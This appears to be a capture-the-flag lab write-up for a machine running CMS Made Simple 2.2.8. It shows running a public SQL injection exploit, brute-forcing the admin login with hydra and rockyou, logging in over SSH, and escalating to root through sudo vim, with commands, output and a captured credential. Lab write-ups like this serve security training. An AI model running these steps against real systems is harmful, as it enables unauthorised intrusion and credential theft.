## Credential
mitch:secret

## Webapge: /simple
- Running 'CMS Made Simple' version 2.2.8
- Login page at `/simeple/admin`
- Search with searchsploit, only 1 script both fit the version and don't require authentication.
		```bash
		$ searchsploit Made Simple
		...
		CMS Made Simple < 2.2.10 - SQL Injection                                                                                                                   | php/webapps/46635.py
		```
- Run the script, it cracks the credential.
		```bash
		$ python 46635.py -u http://10.10.230.228/simple

		[+] Salt for password found: 1dac0d92e9fa6bb2
		[+] Username found: mitch
		[+] Email found: admin@admin.com
		[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
		```
- Run hydra to crack the password.
		```bash
		$ hydra -l mitch -P ~/tools/SecLists/Passwords/Leaked-Databases/rockyou.txt 10.10.230.228 http-post-form '/simple/admin/login.php:username=^USER^&password=^PASS^&loginsubmit=Submit:incorrect' -V -f
		...
		[ATTEMPT] target 10.10.230.228 - login "mitch" - pass "robert" - 77 of 14344398 [child 2] (0/0)
		[ATTEMPT] target 10.10.230.228 - login "mitch" - pass "danielle" - 78 of 14344398 [child 15] (0/0)
		[80][http-post-form] host: 10.10.230.228   login: mitch   password: secret
		[STATUS] attack finished for 10.10.230.228 (valid pair found)
		1 of 1 target successfully completed, 1 valid password found
		Hydra (http://www.thc.org/thc-hydra) finished at 2021-06-17 09:54:58
		```
## User Own
- Login to the ssh (port 2222) with the credential above

## Root Own
- Found that we can sudo with vim.
		```bash
		mitch@Machine:~$ sudo -l
		User mitch may run the following commands on Machine:
			(root) NOPASSWD: /usr/bin/vim
		```
- Read root flag using vim. Done.
		```bash
		mitch@Machine:~$ sudo vim /root/root.txt
		```


